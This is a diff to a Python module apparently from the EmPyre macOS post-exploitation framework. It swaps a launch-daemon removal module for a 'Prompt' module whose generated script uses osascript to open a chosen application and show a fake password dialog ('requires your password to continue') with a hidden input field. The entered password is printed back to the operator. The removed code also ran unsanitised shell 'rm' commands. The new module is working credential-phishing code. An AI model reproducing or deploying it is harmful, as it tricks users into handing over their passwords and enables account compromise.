@@ -1,5 +1,3 @@
-from lib.common import helpers
-
 class Module:
 
     def __init__(self, mainMenu, params=[]):
@@ -7,28 +5,30 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'RemoveLaunchDaemon',
+            'Name': 'Prompt',
 
             # list of one or more authors for the module
-            'Author': ['@xorrior'],
+            'Author': ['@FuzzyNop', '@harmj0y'],
 
             # more verbose multi-line description of the module
-            'Description': ('Remove an EmPyre Launch Daemon.'),
+            'Description': ('Launches a specified application with an prompt for credentials with osascript.'),
 
             # True if the module needs to run in the background
             'Background' : False,
 
             # File extension to save the file as
-            'OutputExtension' : None,
+            'OutputExtension' : "",
 
             # if the module needs administrative privileges
-            'NeedsAdmin' : True,
+            'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : True,
-            
+            'OpsecSafe' : False,
+
             # list of any references/other comments
-            'Comments': []
+            'Comments': [
+                "https://github.com/fuzzynop/FiveOnceInYourLife"
+            ]
         }
 
         # any options needed by the module, settable during runtime
@@ -41,17 +41,18 @@ class Module:
                 'Required'      :   True,
                 'Value'         :   ''
             },
-            'PlistPath' : {
-                'Description'   :   'Full path to the plist file to remove.',
+            'AppName' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'The name of the application to launch.',
                 'Required'      :   True,
-                'Value'         :   ''
+                'Value'         :   'App Store'
             },
-            'ProgramPath' : {
-                'Description'   :   'Full path to the bash script/ binary file to remove.',
-                'Required'      :   True,
+            'ListApps' : {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Switch. List applications suitable for launching.',
+                'Required'      :   False,
                 'Value'         :   ''
             }
-
         }
 
         # save off a copy of the mainMenu object to access external functionality
@@ -69,28 +70,28 @@ class Module:
                 if option in self.options:
                     self.options[option]['Value'] = value
 
-
     def generate(self):
-        
-        plistpath = self.options['PlistPath']['Value']
-        programpath = self.options['ProgramPath']['Value']
 
+        listApps = self.options['ListApps']['Value']
+        appName = self.options['AppName']['Value']
 
+        if listApps != "":
+            script = """
+import os
+apps = [ app.split('.app')[0] for app in os.listdir('/Applications/') if not app.split('.app')[0].startswith('.')]
+choices = []
+for x in xrange(len(apps)):
+    choices.append("[%s] %s " %(x+1, apps[x]) )
 
-        script = """
-import subprocess 
+print "\\nAvailable applications:\\n"
+print '\\n'.join(choices)
+"""
 
-process = subprocess.Popen('launchctl unload %s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
-process = subprocess.Popen('rm %s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
-process = subprocess.Popen('rm %s', stdout=subprocess.PIPE, shell=True)
-process.communicate()
-
-print "\\n [+] %s has been removed"
-print "\\n [+] %s has been removed"
-""" %(plistpath,plistpath,programpath,plistpath,programpath)
+        else:
+            # osascript prompt for the specific application
+            script = """
+import os
+print os.popen('osascript -e \\\'tell app "%s" to activate\\\' -e \\\'tell app "%s" to display dialog "%s requires your password to continue." & return  default answer "" with icon 1 with hidden answer with title "%s Alert"\\\'').read()
+""" % (appName, appName, appName, appName)
 
         return script
